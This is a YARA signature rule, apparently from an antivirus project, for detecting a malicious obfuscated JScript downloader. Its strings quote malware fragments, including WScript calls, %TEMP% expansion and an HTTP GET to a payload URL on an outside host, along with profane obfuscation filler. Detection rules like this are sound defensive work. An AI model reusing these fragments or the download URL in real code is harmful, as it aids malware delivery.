rule sig_20160428_541af81fc39a220566c58a4b9c091bba {
  meta:
    description = "datamaliciousorder - file 20160428_541af81fc39a220566c58a4b9c091bba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "97ff4c978dcab9f05e0ac907550c941ab367fbc3636e7c0e224c78844e135b97"

  strings:
    $s1  = "function WdgPiiYgiNtgItpPpoBry(CkjGspVumRxeGplEbzAad){UowEaaNtdYjqRmsRumXvb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function WuqBukTulBmgBehEnkIxy() {return UowEaaNtdYjqRmsRumXvb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function WdgPiiYgiNtgItpPpoBry(CkjGspVumRxeGplEbzAad){UowEaaNtdYjqRmsRumXvb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function WevQlaNqnGsqQawFmkGne(NbpTodGvzJirXdeZlzPcc, FbpWqdDkcDtpBxkWlgXrf){WnlPgeFseUryYorHrjXgn = WnlPgeFseUryYorHrjXgn * 1; " ascii
    $s5  = "var UowEaaNtdYjqRmsRumXvb = function UljCvhYeoXinEttStySvz() {return MsyWmbVxtDktDugUotMds[ZonXloExlJttPaiDqaIlx](\"WScript\"+\"" ascii
    $s6  = "return NbpTodGvzJirXdeZlzPcc - FbpWqdDkcDtpBxkWlgXrf;};" fullword ascii
    $s7  = "YcnRfmLbbLgaKwsOfcZvh[WezAujTjdUfcThmTsnOfu](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s8  = "var MsyWmbVxtDktDugUotMds = this[\"WScript\"];" fullword ascii
    $s9  = "var UowEaaNtdYjqRmsRumXvb = function UljCvhYeoXinEttStySvz() {return MsyWmbVxtDktDugUotMds[ZonXloExlJttPaiDqaIlx](\"WScript\"+\"" ascii
    $s10 = "function WuqBukTulBmgBehEnkIxy() {return UowEaaNtdYjqRmsRumXvb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function WevQlaNqnGsqQawFmkGne(NbpTodGvzJirXdeZlzPcc, FbpWqdDkcDtpBxkWlgXrf){WnlPgeFseUryYorHrjXgn = WnlPgeFseUryYorHrjXgn * 1; " ascii
    $s12 = "function JpnJhySepTvfJueTvlSyq(){return IpdHswBdnYaaXwsMafQbn + \"\";};" fullword ascii
    $s13 = "if (YcnRfmLbbLgaKwsOfcZvh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function PuvKegIvlEfuHoxNbnJch() {return ((PmpOaeYzyPjnHiuMckBqm == true) && (PmpOaeYzyPjnHiuMckBqm == NaeVkkYqpMorGgcXodUzc)) ?" ascii
    $s15 = "function PuvKegIvlEfuHoxNbnJch() {return ((PmpOaeYzyPjnHiuMckBqm == true) && (PmpOaeYzyPjnHiuMckBqm == NaeVkkYqpMorGgcXodUzc)) ?" ascii
    $s16 = "NaeVkkYqpMorGgcXodUzc = true; " fullword ascii
    $s17 = "}while (VwlQtpAagGnkVgbAkgXpn);" fullword ascii
    $s18 = "function OwjSrvSwtAdvKbjFakPbm(){return 23;};" fullword ascii
    $s19 = "PmpOaeYzyPjnHiuMckBqm = true; " fullword ascii
    $s20 = "return WevQlaNqnGsqQawFmkGne(1 == 1 ? RbhFvwUwyRelXkcKgyFmk : 0, 1 == 1 ? CfjNvsVouCcwJcpVtdIfe : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}